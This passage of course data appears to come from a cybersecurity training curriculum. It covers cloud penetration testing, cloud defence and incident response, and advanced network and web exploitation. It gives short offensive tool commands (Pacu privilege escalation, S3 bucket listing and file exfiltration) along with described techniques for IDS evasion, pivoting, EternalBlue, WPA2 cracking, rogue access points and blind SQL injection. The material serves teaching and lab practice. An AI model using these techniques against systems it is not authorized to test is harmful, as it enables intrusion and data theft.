                        <p class="pl-6 mb-4"><strong>Azure Penetration Testing Tools:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Azucar:</strong> A tool for scanning and gathering security-related information from Azure subscriptions, focusing on misconfigurations and insecure settings.</li>
                        </ul>
                        <pre class="pl-6 mb-4">
                            azucar.py -s
                        </pre>
            
                        <p class="pl-6 mb-4"><strong>3. Penetration Testing in GCP</strong></p>
                        <p class="pl-6 mb-4">Google Cloud Platform (GCP) offers a suite of cloud services similar to AWS and Azure. Penetration testing in GCP often focuses on Google Cloud Storage, IAM permissions, and Compute Engine instances.</p>
            
                        <p class="pl-6 mb-4"><strong>Common GCP Targets:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Cloud Storage Buckets: Test for publicly accessible buckets and improper permissions.</li>
                            <li>Compute Engine: Review the security of virtual machine instances, checking for open ports, weak credentials, and outdated software.</li>
                            <li>IAM Roles: Assess IAM roles for excessive permissions and check for roles assigned to service accounts that may lead to privilege escalation.</li>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>GCP Penetration Testing Tools:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>GCPBucketBrute:</strong> A tool for enumerating and testing access to Google Cloud Storage buckets.</li>
                        </ul>
                        <pre class="pl-6 mb-4">python gcpbucketbrute.py --bucket <bucket-name>
                        </pre>
            
                        <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Cloud Penetration Testing Exercise:</strong></li>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Set up a vulnerable AWS or Azure environment (e.g., weak IAM policies or open storage buckets).</li>
                                <li>Use tools like Pacu (for AWS) or Azucar (for Azure) to identify and exploit security weaknesses.</li>
                            </ul>
                        </ul>
                    `},
                {
                    title: 'Part 5: Hands-On Labs: Exploiting Cloud Misconfigurations',
                    content: `
                        <p class="pl-6 mb-4"><strong>4. Hands-On Labs: Exploiting Cloud Misconfigurations</strong></p>
                        <p class="pl-6 mb-4">In these hands-on labs, we will simulate common cloud misconfigurations that attackers often exploit. These labs will focus on improperly configured storage buckets, IAM roles, and API keys.</p>
            
                        <p class="pl-6 mb-4"><strong>Lab 1: Exploiting Public S3 Buckets</strong></p>
                        <p class="pl-6 mb-4">In this lab, you will practice identifying and exploiting publicly accessible AWS S3 buckets.</p>
            
                        <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>1. Set up an S3 Bucket:</strong> Create an S3 bucket in AWS and deliberately configure it with weak permissions (publicly readable and writable).</li>
                            <li><strong>2. Find Public S3 Buckets:</strong> Use tools like AWS CLI to list and query public S3 buckets.</li>
                            <pre class="pl-6">aws s3api list-buckets</pre>
                            <pre class="pl-6">aws s3 ls s3://bucket-name --no-sign-request
                            </pre>
                            <li><strong>3. Exfiltrate Data:</strong> List the contents of the S3 bucket and download files to demonstrate the impact of this misconfiguration.</li>
                            <pre class="pl-6 mb-4">aws s3 cp s3://bucket-name/file.txt .
                            </pre>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>S3 Bucket Exploitation:</strong> Create a vulnerable S3 bucket and simulate an attacker accessing and exfiltrating sensitive data.</li>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>Lab 2: Exploiting Insecure IAM Roles</strong></p>
                        <p class="pl-6 mb-4">In this lab, you will analyze weak IAM roles in AWS and use them to escalate privileges or access unauthorized services.</p>
            
                        <p class="pl-6 mb-4"><strong>Steps:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>1. Create a Weak IAM Role:</strong> Set up an IAM role with overly permissive policies (e.g., full access to all S3 buckets).</li>
                            <li><strong>2. Privilege Escalation:</strong> Use tools like Pacu to enumerate available roles and escalate privileges.</li>
                            <pre class="pl-6">pacu> run iam__enum_roles</pre>
                            <pre class="pl-6">pacu> run iam__privilege_escalation
                            </pre>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>IAM Role Exploitation:</strong> Analyze an IAM role with weak policies and demonstrate how it can be used to escalate privileges or access unauthorized resources.</li>
                        </ul>
                    `},
                    {
                        title: 'Assignment for Week 1',
                        content: `
                            <p class="pl-6 mb-4"><strong>Assignment for Week 1:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Cloud Security Threat Report:</strong> Research a real-world cloud security breach (e.g., Capital One, Uber) and write a report explaining how the breach occurred and what could have been done to prevent it.</li>
                                <li><strong>Cloud Misconfiguration Lab:</strong> Set up an AWS environment and deliberately misconfigure a resource (e.g., an S3 bucket or IAM role). Use Pacu or ScoutSuite to identify and exploit the misconfiguration. Write a report on the steps taken and the impact of the misconfiguration.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Additional Reading:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Book:</strong> "Practical Cloud Security: A Guide for Secure Design and Deployment" by Chris Dotson — A comprehensive guide to securing cloud environments, with a focus on best practices and real-world examples.</li>
                                <li><strong>AWS Well-Architected Framework:</strong> A guide by AWS that provides best practices for building secure, high-performing cloud applications.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Next Week Preview:</strong></p>
                            <p class="pl-6 mb-4">Next week, we will explore Securing Cloud Environments, where we will learn about cloud security best practices, how to secure APIs in the cloud, and how to implement monitoring and incident response for cloud platforms.</p>
                        `},
                {
                    title: 'Week 2: Securing Cloud Environments',
                    content: `
                        <p class="pl-6 mb-4"><strong>Part 1: Securing Cloud Environments</strong></p>
                        <p class="pl-6 mb-4">In this module, we focus on how to secure cloud environments effectively by implementing cloud security best practices and API security measures. We will also explore the importance of monitoring and incident response in cloud infrastructures, which are critical for identifying and mitigating potential attacks in real-time. Finally, we will examine case studies of cloud security incidents to understand real-world scenarios and the lessons learned from these breaches.</p>
                        
                        <p class="pl-6 mb-4"><strong>Topics Covered:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Cloud security best practices and API security.</li>
                            <li>Monitoring and incident response in cloud environments.</li>
                            <li>Case studies of cloud security incidents.</li>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>1. Cloud Security Best Practices and API Security</strong></p>
                        <p class="pl-6 mb-4">Securing cloud environments requires a combination of strong architectural design, robust identity and access management, secure configuration practices, and continuous monitoring. One of the most critical components of cloud security is API security, as APIs are the backbone of cloud services and are often a primary attack vector.</p>
            
                        <p class="pl-6 mb-4"><strong>1.1 Identity and Access Management (IAM)</strong></p>
                        <p class="pl-6 mb-4">Effective Identity and Access Management (IAM) is crucial for controlling who has access to cloud resources. Misconfigurations in IAM settings can lead to privilege escalation or unauthorized access to sensitive data.</p>
            
                        <p class="pl-6 mb-4"><strong>Best Practices:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Principle of Least Privilege:</strong> Ensure that users and services have only the permissions they need and no more. Regularly review IAM roles to minimize excessive privileges.</li>
                            <li><strong>Multi-Factor Authentication (MFA):</strong> Enforce MFA for all critical cloud accounts, especially for accounts with elevated privileges (e.g., admins).</li>
                            <li><strong>Service Accounts:</strong> Use distinct service accounts for applications, and assign each one the minimum required permissions to reduce attack surface.</li>
                            <li><strong>Role-Based Access Control (RBAC):</strong> Use roles instead of individual permissions, assigning users to roles based on job function.</li>
                        </ul>
            
                        
                    `},
                    {
                        title: 'Securing Cloud Environments: Part 2',
                        content: `
                                <p class="pl-6 mb-4"><strong>1.2 Encryption and Data Protection</strong></p>
                        <p class="pl-6 mb-4">Cloud environments host sensitive data, and encryption is essential to protect it from unauthorized access.</p>
            
                        <p class="pl-6 mb-4"><strong>Best Practices:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Encryption at Rest and in Transit:</strong> Ensure that all sensitive data is encrypted at rest (using services like AWS KMS, Azure Key Vault, or Google Cloud KMS) and in transit (using HTTPS/TLS).</li>
                            <li><strong>Key Management:</strong> Use centralized and secure key management solutions. Avoid hardcoding keys or storing them in source code repositories.</li>
                            <li><strong>Tokenization:</strong> Use tokenization for sensitive data like payment details or personally identifiable information (PII), replacing sensitive data with non-sensitive equivalents.</li>
                        </ul>
                            <p class="pl-6 mb-4"><strong>1.3 Secure Configuration and Hardening</strong></p>
                            <p class="pl-6 mb-4">Misconfigurations are a leading cause of cloud security breaches. Implement secure configurations across all services and use automated tools to ensure configurations are hardened against attacks.</p>
                            
                            <p class="pl-6 mb-4"><strong>Best Practices:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Secure Baseline Configurations:</strong> Use security benchmarks like CIS Benchmarks to configure secure settings for cloud services (e.g., EC2 instances, databases).</li>
                                <li><strong>Continuous Configuration Auditing:</strong> Tools like AWS Config, Azure Policy, and GCP Cloud Security Command Center can continuously monitor cloud configurations for policy violations or security weaknesses.</li>
                                <li><strong>Vulnerability Management:</strong> Regularly patch and update all systems, virtual machines, containers, and applications. Use automated tools for patch management.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>2. API Security</strong></p>
                            <p class="pl-6 mb-4">Cloud environments rely heavily on APIs to manage services, resources, and applications. Insecure APIs can expose cloud infrastructures to various attacks, such as data exfiltration, privilege escalation, and account compromise.</p>
                        `},
                {
                    title: '',
                    content: `
                        
                    <p class="pl-6 mb-4"><strong>API Security Best Practices:</strong></p>

                    <p class="pl-6 mb-4"><strong>2.1 Authentication and Authorization</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>API Keys and OAuth:</strong> Use API keys or OAuth for authenticating API requests. Ensure that API keys are rotated regularly and never hardcoded in client-side applications or code repositories.</li>
                        <li><strong>Fine-Grained Access Controls:</strong> Implement least privilege principles when assigning access to APIs, ensuring that only authorized users or services can call specific API endpoints.</li>
                    </ul>

                    <p class="pl-6 mb-4"><strong>2.2 Rate Limiting and Throttling</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Rate Limiting:</strong> Implement rate limiting to prevent abuse of APIs through brute-force attacks or denial-of-service (DoS) attacks.</li>
                        <li><strong>Throttling:</strong> Throttle API usage by enforcing quotas or limits on the number of requests a user or service can make in a given time period. This helps prevent resource exhaustion and improves system resilience.</li>
                    </ul>
                    <p class="pl-6 mb-4"><strong>2.3 Input Validation and Output Encoding</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Input Validation:</strong> Properly validate and sanitize all input sent to API endpoints to prevent injection attacks (e.g., SQL injection, command injection).</li>
                        <li><strong>Output Encoding:</strong> Ensure that API responses are encoded properly to prevent data leakage and Cross-Site Scripting (XSS) attacks.</li>
                    </ul>

                    <p class="pl-6 mb-4"><strong>Tools for API Security:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>OWASP API Security Top 10:</strong> Follow OWASP’s guidelines for securing APIs and protecting them from common attack vectors.</li>
                        <li><strong>API Gateway:</strong> Use services like AWS API Gateway or Azure API Management to centrally manage and secure API requests, handle authentication, enforce quotas, and monitor usage.</li>
                    </ul>

                    <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>API Security Implementation:</strong></li>
                        <ol class="pl-6 mb-4">
                            <li>Set up an API using AWS API Gateway or Azure API Management.</li>
                            <li>Implement rate limiting, secure authentication (OAuth 2.0), and input validation for API requests.</li>
                            <li>Test the security of the API by simulating attacks like brute force and injection attacks.</li>
                        </ol>
                    </ul>
                    `},
            {
                title: 'Part 3: Monitoring and Incident Response in Cloud Environments',
                content: `
                    <p class="pl-6 mb-4"><strong>2. Monitoring and Incident Response in Cloud Environments</strong></p>
                    <p class="pl-6 mb-4">Monitoring and incident response in the cloud is essential for detecting malicious activity, responding to security incidents, and recovering from breaches. Effective monitoring involves capturing detailed logs, setting up alerts, and automating responses to potential security incidents.</p>

                    <p class="pl-6 mb-4"><strong>1. Cloud Monitoring and Logging</strong></p>

                    <p class="pl-6 mb-4"><strong>1.1 Log Collection and Aggregation</strong></p>
                    <p class="pl-6 mb-4">Cloud platforms offer built-in logging services to capture events and activities across cloud resources. It is important to aggregate logs across multiple services for a unified view of potential threats.</p>
                    
                    <p class="pl-6 mb-4"><strong>Tools for Cloud Logging:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>AWS CloudTrail:</strong> Logs all API calls and actions taken on AWS resources. It helps detect unauthorized access or misuse of services.</li>
                        <li><strong>Azure Monitor:</strong> Provides monitoring and logging for Azure resources, including activity logs, performance metrics, and diagnostic logs.</li>
                        <li><strong>Google Cloud Logging:</strong> GCP’s logging service for collecting and analyzing logs across all GCP services.</li>
                    </ul>

                    <p class="pl-6 mb-4"><strong>1.2 Threat Detection</strong></p>
                    <p class="pl-6 mb-4">Detecting threats early is crucial for mitigating attacks in real time. Security Information and Event Management (SIEM) solutions analyze logs and trigger alerts for suspicious behavior, such as privilege escalation or brute-force attacks.</p>

                    <p class="pl-6 mb-4"><strong>Cloud-Native Threat Detection Tools:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>AWS GuardDuty:</strong> A threat detection service that continuously monitors for malicious activity, including unauthorized access or unusual API calls.</li>
                        <li><strong>Azure Security Center:</strong> Identifies and mitigates security vulnerabilities in Azure environments, offering real-time threat detection.</li>
                        <li><strong>GCP Security Command Center:</strong> Centralized security management and monitoring platform for identifying vulnerabilities and detecting threats in GCP environments.</li>
                    </ul>
                `},
                {
                    title: '',
                    content:`
                    <p class="pl-6 mb-4"><strong>1.3 Alerts and Automated Responses</strong></p>
                    <p class="pl-6 mb-4">Use automation to streamline incident response workflows, ensuring that alerts are handled promptly.</p>

                    <p class="pl-6 mb-4"><strong>Best Practices:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Configuring Alerts:</strong> Set up custom alerts for key security events such as failed login attempts, API misuse, or abnormal traffic patterns. Services like AWS CloudWatch, Azure Monitor, and Google Cloud Monitoring allow you to configure these alerts.</li>
                        <li><strong>Automated Responses:</strong> Use tools like AWS Lambda or Azure Logic Apps to automatically respond to certain incidents. For example, if unauthorized access is detected, automatically rotate API keys or shut down suspicious instances.</li>
                    </ul>
                    <p class="pl-6 mb-4"><strong>2. Cloud Incident Response</strong></p>
                    <p class="pl-6 mb-4">Incident response in cloud environments must be swift and well-coordinated to minimize the impact of security breaches. Cloud providers offer services and tools to help streamline this process.</p>

                    <p class="pl-6 mb-4"><strong>Key Steps in Cloud Incident Response:</strong></p>

                    <p class="pl-6 mb-4"><strong>2.1 Preparation</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Incident Response Playbooks:</strong> Develop specific playbooks for different types of cloud incidents (e.g., data breaches, DDoS attacks, account compromise).</li>
                        <li><strong>Access Controls:</strong> Ensure that incident response teams have appropriate access to the cloud environment to contain and mitigate threats quickly.</li>
                    </ul>

                    <p class="pl-6 mb-4"><strong>2.2 Detection and Identification</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Real-Time Alerts:</strong> Monitor alerts and use SIEM solutions to detect anomalies such as data exfiltration, privilege escalation, or brute-force login attempts.</li>
                        <li><strong>Log Analysis:</strong> During an incident, logs from services like CloudTrail, Azure Monitor, or Google Cloud Logging are crucial for understanding the attack vector and identifying the compromised resource.</li>
                    </ul>`
                },
                {
                    title: 'Part 4: Cloud Incident Response: Containment, Mitigation, and Case Studies',
                    content: `
                        <p class="pl-6 mb-4"><strong>2.3 Containment and Mitigation</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Isolation of Affected Resources:</strong> If a resource is compromised (e.g., an EC2 instance or storage bucket), isolate it from the network immediately to prevent further damage.</li>
                            <li><strong>Revocation of Compromised Credentials:</strong> Rotate or revoke compromised API keys, service credentials, or access tokens as part of containment.</li>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>2.4 Recovery</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Restoration:</strong> Rebuild or restore affected cloud services from known-good backups or configurations.</li>
                            <li><strong>Security Patches:</strong> Apply patches and updates to prevent a recurrence of the incident.</li>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Cloud Monitoring and Response Lab:</strong></li>
                            <ul class="list-inside pl-6 mb-4">
                                <li>Set up AWS GuardDuty or Azure Security Center to monitor a cloud environment.</li>
                                <li>Simulate a security incident (e.g., unauthorized API calls) and respond by isolating the affected resource and rotating access keys.</li>
                                <li>Write a report outlining the incident response process and the tools used to detect and mitigate the threat.</li>
                            </ul>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>3. Case Studies of Cloud Security Incidents</strong></p>
                        <p class="pl-6 mb-4">Understanding real-world cloud security incidents provides valuable insights into the threats organizations face in cloud environments and the steps that could have been taken to prevent breaches.</p>
            
                        <p class="pl-6 mb-4"><strong>1. Capital One Data Breach (2019)</strong></p>
                        <p class="pl-6 mb-4"><strong>Incident Overview:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>A misconfigured AWS Web Application Firewall (WAF) allowed attackers to exploit a vulnerability and access sensitive data stored in S3 buckets.</li>
                            <li>Over 100 million customer records, including social security numbers and credit information, were exposed.</li>
                        </ul>
            
                        <p class="pl-6 mb-4"><strong>Lessons Learned:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Proper IAM controls and least privilege principles could have prevented the breach by restricting access to sensitive data.</li>
                            <li>Continuous monitoring of S3 bucket configurations for public access would have mitigated the risk.</li>
                        </ul>
                    `},
                    {
                        title: 'Part 5: Uber Data Breach and Week 18 Assignments',
                        content: `
                            <p class="pl-6 mb-4"><strong>3. Uber Data Breach (2016)</strong></p>
                            <p class="pl-6 mb-4"><strong>Incident Overview:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Attackers accessed sensitive customer data stored on AWS S3 by using credentials that were inadvertently exposed in an AWS GitHub repository.</li>
                                <li>The breach affected the personal data of 57 million users, including names, phone numbers, and email addresses.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Lessons Learned:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Avoid hardcoding credentials or storing them in public code repositories.</li>
                                <li>Use environment variables or secure vault solutions like AWS Secrets Manager to store sensitive credentials.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Assignment for Week 18:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Cloud Incident Response Report:</strong> Set up a cloud monitoring and incident response framework in AWS or Azure. Simulate an incident, such as unauthorized access to an S3 bucket, and document your response, including logs, alerts, and mitigation steps.</li>
                                <li><strong>Case Study Analysis:</strong> Choose a real-world cloud security breach (e.g., Capital One, Tesla) and write a report explaining how the breach occurred, what cloud-specific vulnerabilities were exploited, and the security controls that could have prevented it.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Additional Reading:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Book:</strong> "Cloud Security and Privacy" by Tim Mather — A comprehensive guide to securing cloud environments, with a focus on privacy, compliance, and best practices.</li>
                                <li><strong>NIST Cloud Security Guidelines:</strong> Official guidelines from NIST on cloud security best practices and controls for managing risk.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Next Week Preview:</strong></p>
                            <p class="pl-6 mb-4">Next week, we will begin Advanced Threat Hunting and Incident Response, where we’ll dive into techniques for identifying and mitigating advanced persistent threats (APTs) in both cloud and on-premises environments.</p>
                        `}

                ],
                videoUrl: '',
                commands: [],
                content: ''        
                },
        ]
    }, 
    {
    id: "exploitation-techniques",
    title: " Exploitation Techniques",
    chapters: [
                {   
                id: "module-6",
                title: 'Module 8 - Advanced Exploitation Techniques ', 
                icon: Shield, 
                sections: [ 
                    {
                        title: 'Week 1:Advanced Network Exploitation',
                        content: `
                            <h4 class="font-bold mb-4">Part:1 Advanced Network Exploitation</h4>
                            <p class="pl-6 mb-6">This module focuses on Advanced Network Exploitation, where you will learn sophisticated techniques to bypass firewalls, intrusion detection systems, and navigate through compromised networks. You will also explore attacks targeting advanced network protocols like IPv6, SNMP, SMB, and NFS, as well as exploiting wireless networks through WPA2 cracking and Rogue Access Points (APs).</p>
                
                            <h5 class="font-bold">Topics Covered:</h5>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Bypassing firewalls and intrusion detection systems (IDS).</li>
                                <li>Pivoting and lateral movement within compromised networks.</li>
                                <li>Exploiting advanced network protocols: IPv6, SNMP, SMB, and NFS.</li>
                                <li>Wireless Network Exploitation: WPA2 Cracking, Rogue APs.</li>
                            </ul>
                
                            <h4 class="font-bold">1. Bypassing Firewalls and Intrusion Detection Systems (IDS)</h4>
                            <p class="pl-6 mb-6">Firewalls and IDS/IPS systems are designed to detect and block malicious traffic. However, attackers use a variety of techniques to bypass these defenses.</p>
                
                            <h5 class="font-bold">Techniques for Bypassing Firewalls:</h5>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Port Knocking:</strong> Concealing services behind closed ports that open only after a sequence of connection attempts.</li>
                                <li><strong>Tunneling:</strong> Encapsulating attack traffic within protocols that are allowed by the firewall (e.g., using HTTP, DNS, or ICMP tunnels).</li>
                                <li><strong>Fragmentation:</strong> Splitting malicious payloads across multiple packets, making it harder for the firewall or IDS to detect the entire attack sequence.</li>
                            </ul>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p class="pl-6 mb-4"><strong>DNS Tunneling:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use a tool like Iodine to set up DNS tunneling between a client and a server, bypassing a firewall that blocks other traffic types.</li>
                                <li>Document how this method allows exfiltration of data through DNS requests.</li>
                            </ul>
                        `},
                    {
                        title: 'Advanced Network Exploitation (Continued)',
                        content: `
                            <h4 class="font-bold">Part:2 Techniques for Bypassing IDS/IPS</h4>
                            <p class="pl-6">• Evasion Techniques: Modify the attack payload so it is not recognized by signature-based detection systems (e.g., obfuscation, encryption).</p>
                            <p class="pl-6">• Traffic Padding: Adding noise or extra benign data to a payload to confuse detection algorithms.</p>
                            <p class="pl-6 mb-6">• Packet Fragmentation: Breaking payloads into multiple fragments that individually appear harmless.</p>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p><strong>IDS Evasion:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use Metasploit to launch a simulated attack with an evasion technique (e.g., shikata_ga_nai encoder).</li>
                                <li>Analyze whether the attack was detected by an IDS (such as Snort) and explain why or why not.</li>
                            </ul>
                
                            <h4 class="font-bold">2. Pivoting and Lateral Movement Within Compromised Networks</h4>
                            <p class="pl-6 mb-6">Once an attacker gains access to a system, they may not immediately find valuable data. Pivoting and lateral movement allow attackers to navigate through the network to find high-value targets, such as databases, sensitive files, or domain controllers.</p>
                
                            <h5 class="font-bold">Pivoting:</h5>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Pivoting enables an attacker to use a compromised system as a springboard to attack other systems in the network that were previously inaccessible.</li>
                                <li>Proxychains and SSH tunneling are common tools to enable pivoting.</li>
                            </ul>
                
                            <h5 class="font-bold">Lateral Movement:</h5>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Lateral movement involves using legitimate network services and protocols (e.g., SMB, RDP, WMI) to move between systems.</li>
                                <li>Attackers often exploit weak credentials or pass-the-hash attacks to move laterally through the network.</li>
                            </ul>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p><strong>Metasploit Pivoting:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Compromise a machine using Metasploit.</li>
                                <li>Set up a pivot through the compromised machine to attack another internal system.</li>
                                <li>Document the process of lateral movement and list the tools used.</li>
                            </ul>
                        `},
                    {
                        title: 'Part:3 Exploiting Advanced Network Protocols: IPv6, SNMP, SMB, and NFS',
                        content: `
                            <h4 class="font-bold">1. IPv6 Exploitation</h4>
                            <p class="pl-6 mb-4">Many networks are configured with IPv6 enabled by default, even if they are not fully utilizing it. Attackers can exploit misconfigurations or vulnerabilities in IPv6 protocols.</p>
                
                            <h5 class="font-bold">Techniques:</h5>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Rogue Router Advertisement:</strong> An attacker can broadcast rogue IPv6 router advertisements to trick hosts into sending traffic through a malicious node.</li>
                                <li><strong>DNS Exfiltration via IPv6:</strong> Use of IPv6 tunneling to bypass network restrictions and exfiltrate data.</li>
                            </ul>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p class="pl-6 mb-4"><strong>Rogue Router Advertisement Attack:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use THC-IPv6 tools to send rogue router advertisements and intercept traffic.</li>
                                <li>Analyze how enabling IPv6 in networks provides new attack surfaces.</li>
                            </ul>
                
                            <h4 class="font-bold">2. SNMP Exploitation</h4>
                            <p class="pl-6 mb-4">SNMP (Simple Network Management Protocol) is used to manage network devices. Attackers can exploit weak SNMP community strings (e.g., "public") to gain read/write access to devices, which can lead to information disclosure or full system compromise.</p>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p class="pl-6 mb-4"><strong>SNMP Enumeration and Exploitation:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use snmpwalk or onesixtyone to enumerate network devices via SNMP.</li>
                                <li>Document any exposed information, such as device configuration details, and explain how this data can be used to further compromise the network.</li>
                            </ul>
                
                            <h4 class="font-bold">3. SMB Exploitation</h4>
                            <p class="pl-6 mb-4">SMB (Server Message Block) is used for file sharing in Windows environments. Weak configurations or vulnerabilities like SMB Relay or EternalBlue can allow attackers to exploit SMB services.</p>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p class="pl-6 mb-4"><strong>SMB Exploitation:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use Metasploit to exploit the EternalBlue vulnerability on a vulnerable machine (e.g., Metasploitable2).</li>
                                <li>Document the attack and the results, such as access to sensitive files or system control.</li>
                            </ul>
                        `},
                    {
                        title: 'Exploiting Advanced Network Protocols: IPv6, SNMP, SMB, and NFS (Continued)',
                        content: `
                            <h4 class="font-bold">4. NFS Exploitation</h4>
                            <p class="pl-6 mb-4">NFS (Network File System) allows file sharing over a network. Misconfigured NFS exports may allow unauthorized access to sensitive files.</p>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p class="pl-6 mb-4"><strong>NFS Enumeration:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use showmount to list NFS shares on a target machine.</li>
                                <li>Mount the share and access the files to demonstrate the security risk posed by insecure NFS configurations.</li>
                            </ul>
                
                            <h1 class="font-bold text-2xl">Part:4. Wireless Network Exploitation: WPA2 Cracking, Rogue APs</h1>
                
                            <h5 class="font-bold">1. WPA2 Cracking</h5>
                            <p class="pl-6 mb-4">WPA2 is widely used for wireless network encryption, but vulnerabilities exist that allow for the cracking of passwords through brute-force attacks.</p>
                
                            <h5 class="font-bold">Techniques:</h5>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Capture the Handshake:</strong> Use airmon-ng and airodump-ng to capture the WPA2 handshake when a device connects to the network.</li>
                                <li><strong>Brute Force Attack:</strong> Use aircrack-ng or Hashcat to crack the WPA2 handshake using a wordlist or dictionary attack.</li>
                            </ul>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p class="pl-6 mb-4"><strong>WPA2 Cracking:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use aircrack-ng tools to capture a WPA2 handshake from a wireless network.</li>
                                <li>Attempt to crack the password using a dictionary attack with Hashcat or aircrack-ng.</li>
                            </ul>
                
                            <h5 class="font-bold">2. Rogue Access Points (Rogue APs)</h5>
                            <p class="pl-6 mb-4">A Rogue Access Point (Rogue AP) is a wireless access point that is set up to appear legitimate but is controlled by an attacker. Victims unknowingly connect to the rogue AP, allowing attackers to intercept and manipulate traffic.</p>
                
                            <h5 class="font-bold">Techniques:</h5>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Evil Twin Attack:</strong> Clone a legitimate AP’s SSID and lure victims into connecting to the rogue AP.</li>
                                <li><strong>Traffic Interception:</strong> Once connected, capture victim traffic, including login credentials or session cookies.</li>
                            </ul>
                
                            <h4 class="font-bold">Practical Activity:</h4>
                            <p class="pl-6 mb-4"><strong>Set Up a Rogue AP:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use airbase-ng or hostapd to create a rogue access point.</li>
                                <li>Capture traffic from connected devices using Wireshark.</li>
                                <li>Document the intercepted credentials or session tokens.</li>
                            </ul>
                        `},
                    {
                        title: 'Week :2 Advanced Web Exploitation: SQL Injection Techniques',
                        content: `
                            <h4 class="font-bold">Part :1 Advanced Web Exploitation</h4>
                
                            <h5 class="font-bold">1. Advanced SQL Injection Techniques: Blind, Time-Based, Out-of-Band</h5>
                            <p class="pl-6 mb-4">In this section, we dive deeper into advanced SQL injection techniques, which can be used when basic SQL injection is not possible.</p>
                
                            <h5 class="font-bold">1. Blind SQL Injection</h5>
                            <p class="pl-6 mb-4">In Blind SQL Injection, attackers do not see the results of their SQL queries directly. Instead, they infer the database’s response based on application behavior (e.g., true/false responses).</p>
                
                            <h5 class="font-bold">Techniques:</h5>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Boolean-based:</strong> Use conditions like AND 1=1 (True) and AND 1=2 (False) to infer database behavior.</li>
                                <li><strong>Time-based:</strong> Use SQL queries that delay the server response to determine whether the query was successful.</li>
                            </ul>
                
                            <h4 class="font-bold">Practical Activity:</h4>
